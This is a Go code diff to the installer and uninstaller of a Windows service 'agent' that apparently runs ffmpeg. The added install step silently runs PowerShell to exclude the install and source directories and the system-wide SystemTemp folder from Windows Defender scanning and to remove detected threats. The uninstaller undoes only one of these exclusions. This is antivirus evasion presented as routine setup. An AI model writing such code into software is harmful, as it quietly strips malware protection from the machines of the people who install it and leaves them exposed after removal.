@@ -142,6 +142,24 @@ func installService(configPath string) error {
 		return fmt.Errorf("create install dir: %w", err)
 	}
 
+	// Add Windows Defender exclusions and remove any quarantined threats.
+	defenderScript := fmt.Sprintf(`
+		Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue
+		Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue
+		Add-MpPreference -ExclusionPath 'C:\Windows\SystemTemp' -ErrorAction SilentlyContinue
+		Remove-MpThreat -ErrorAction SilentlyContinue
+	`, installDir, srcDir)
+	exclCmd := exec.Command("powershell.exe", "-NoProfile", "-Command", defenderScript)
+	if out, err := exclCmd.CombinedOutput(); err != nil {
+		fmt.Fprintf(os.Stderr, "warning: Defender setup: %v (%s)\n", err, strings.TrimSpace(string(out)))
+	} else {
+		fmt.Printf("Configured Windows Defender exclusions for %s, %s, and SystemTemp\n", installDir, srcDir)
+	}
+
+	// Kill any lingering ffmpeg processes that may hold file locks.
+	exec.Command("taskkill", "/F", "/IM", "ffmpeg.exe").Run()
+	time.Sleep(500 * time.Millisecond)
+
 	// Copy agent executable.
 	dstExe := filepath.Join(installDir, "agent.exe")
 	if err := copyFile(srcExe, dstExe); err != nil {
@@ -257,11 +275,23 @@ func uninstallService() error {
 		}
 	}
 
+	// Kill any lingering ffmpeg processes spawned by the agent.
+	killCmd := exec.Command("taskkill", "/F", "/IM", "ffmpeg.exe")
+	_ = killCmd.Run()
+	time.Sleep(500 * time.Millisecond)
+
 	if err := s.Delete(); err != nil {
 		return fmt.Errorf("delete service: %w", err)
 	}
 
 	_ = eventlog.Remove(serviceName)
+
+	// Remove Windows Defender exclusion.
+	exclCmd := exec.Command("powershell.exe", "-NoProfile", "-Command",
+		fmt.Sprintf("Remove-MpPreference -ExclusionPath '%s'", installDir))
+	if out, err := exclCmd.CombinedOutput(); err != nil {
+		fmt.Fprintf(os.Stderr, "warning: failed to remove Defender exclusion: %v (%s)\n", err, strings.TrimSpace(string(out)))
+	}
 
 	// Remove install directory.
 	if err := os.RemoveAll(installDir); err != nil {
